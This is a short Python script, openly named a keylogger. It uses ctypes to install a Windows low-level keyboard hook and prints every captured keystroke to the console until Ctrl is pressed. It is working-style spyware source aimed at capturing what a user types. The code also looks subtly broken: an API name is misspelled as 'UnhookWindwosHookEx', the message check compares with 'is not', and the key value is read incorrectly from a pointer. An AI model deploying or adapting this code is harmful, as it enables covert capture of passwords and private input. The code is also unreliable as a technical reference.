import sys
from ctypes import *
from ctypes.wintypes import MSG
from ctypes.wintypes import DWORD

user32 = windll.user32

kernel32 = windll.kernel32

WH_KEYBOARD_LL = 13
WM_KEYBOARD = 0x0100
CTRL_CODE = 162

class KeyLogger:
  def __init__(self):
    self.IUser32 = user32
    self.hooked = None
  def installHookProc(self, pointer):
    self.hooked = self.IUser32.SetWindowsHookExA(
      WH_KEYBOARD_LL,
      pointer,
      kernel32.GetModuleHandleW(None),
      0
    )
    if not self.hooked:
      return False
    return True

  def uninstallHookProc(self):
    if self.hooked is None:
      return
    self.IUser32.UnhookWindwosHookEx(self.hooked)
    self.hooked = None


def getFPTR(fn):
  CMPFUNC = CFUNCTYPE(c_int, c_int, c_int,POINTER(c_void_p))
  return CMPFUNC(fn)

def hookProc(nCode, wParam, IParam):
  if wParam is not WM_KEYBOARD:
    return user32.CallNextHookEx(KeyLogger.hooked, nCode,wParam,IParam)
  hookedKey = chr(IParam[0])
  print(hookedKey)
  if(CTRL_CODE == int(IParam[0])):
    print("Ctrl pressed, call uninstallHook()")
    KeyLogger.uninstallHookProc()
    sys.exit(-1)
  return user32.CallNextHookEx(KeyLogger.hooked, nCode, wParam, IParam)

def startKeyLog():
  msg = MSG()
  user32.GetMessageA(byref(msg),0,0,0)

KeyLogger = KeyLogger() #start of hook process
pointer = getFPTR(hookProc)

if KeyLogger.installHookProc(pointer):
  print("installed keyLogger")

startKeyLog()
